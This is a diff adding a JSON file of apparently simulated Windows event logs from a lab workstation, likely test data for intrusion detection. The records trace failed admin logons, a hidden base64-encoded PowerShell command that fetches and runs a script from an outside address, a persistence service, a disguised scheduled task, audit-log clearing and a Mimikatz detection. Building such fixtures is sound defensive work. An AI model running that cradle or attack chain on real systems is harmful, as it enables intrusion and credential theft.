@@ -1,0 +1,66 @@
+[
+  {
+    "EventID": 4625,
+    "TimeCreated": "2026-10-24T19:30:10.500Z",
+    "Channel": "Security",
+    "Computer": "CORP-WKS-042.internal.lab",
+    "Message": "An account failed to log on. Subject: Security ID: NULL SID. Account Name: Administrator. Failure Reason: Unknown user name or bad password. Source Network Address: 192.168.1.185. Workstation Name: ATTACK-STATION",
+    "IpAddress": "192.168.1.185",
+    "TargetUserName": "Administrator",
+    "Status": "0xC000006A"
+  },
+  {
+    "EventID": 4625,
+    "TimeCreated": "2026-10-24T19:30:14.200Z",
+    "Channel": "Security",
+    "Computer": "CORP-WKS-042.internal.lab",
+    "Message": "An account failed to log on. Subject: Security ID: NULL SID. Account Name: Administrator. Failure Reason: Unknown user name or bad password. Source Network Address: 192.168.1.185. Workstation Name: ATTACK-STATION",
+    "IpAddress": "192.168.1.185",
+    "TargetUserName": "Administrator",
+    "Status": "0xC000006A"
+  },
+  {
+    "EventID": 4688,
+    "TimeCreated": "2026-10-24T19:35:00.120Z",
+    "Channel": "Security",
+    "Computer": "CORP-WKS-042.internal.lab",
+    "Message": "A new process has been created. Creator Process Name: C:\\Windows\\System32\\cmd.exe. New Process Name: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe. Process Command Line: powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADkAOQAvAGEALgBwAHMAMQAnACkA",
+    "CommandLine": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc SQBFAFgA...",
+    "TargetUserName": "svc_backup"
+  },
+  {
+    "EventID": 7045,
+    "TimeCreated": "2026-10-24T19:36:22.800Z",
+    "Channel": "System",
+    "Computer": "CORP-WKS-042.internal.lab",
+    "Message": "A service was installed in the system. Service Name: PersistenceAgentSvc. Service File Name: C:\\ProgramData\\Agents\\persist.exe. Service Type: user mode service. Service Start Type: auto start.",
+    "ServiceName": "PersistenceAgentSvc",
+    "TargetUserName": "SYSTEM"
+  },
+  {
+    "EventID": 4698,
+    "TimeCreated": "2026-10-24T19:37:10.050Z",
+    "Channel": "Security",
+    "Computer": "CORP-WKS-042.internal.lab",
+    "Message": "A scheduled task was created. Task Name: \\Microsoft\\Windows\\Maintenance\\UpdateSync. Task Content Action: C:\\Windows\\System32\\cmd.exe /c start C:\\ProgramData\\Agents\\beacon.bat",
+    "TaskName": "UpdateSync",
+    "TargetUserName": "Administrator"
+  },
+  {
+    "EventID": 1102,
+    "TimeCreated": "2026-10-24T19:40:05.900Z",
+    "Channel": "Security",
+    "Computer": "CORP-WKS-042.internal.lab",
+    "Message": "The audit log was cleared. Subject User: svc_backup. Domain: INTERNAL. Client Process ID: 4128.",
+    "TargetUserName": "svc_backup"
+  },
+  {
+    "EventID": 1116,
+    "TimeCreated": "2026-10-24T19:42:15.300Z",
+    "Channel": "Microsoft-Windows-Windows Defender/Operational",
+    "Computer": "CORP-WKS-042.internal.lab",
+    "Message": "Microsoft Defender Antivirus has detected malware or other potentially unwanted software. Threat Name: HackTool:Win32/Mimikatz.amsi!dha. Severity: Severe. Category: CredentialStealer. Path: file:_C:\\ProgramData\\Agents\\m.exe",
+    "ThreatName": "HackTool:Win32/Mimikatz.amsi!dha",
+    "Path": "C:\\ProgramData\\Agents\\m.exe"
+  }
+]
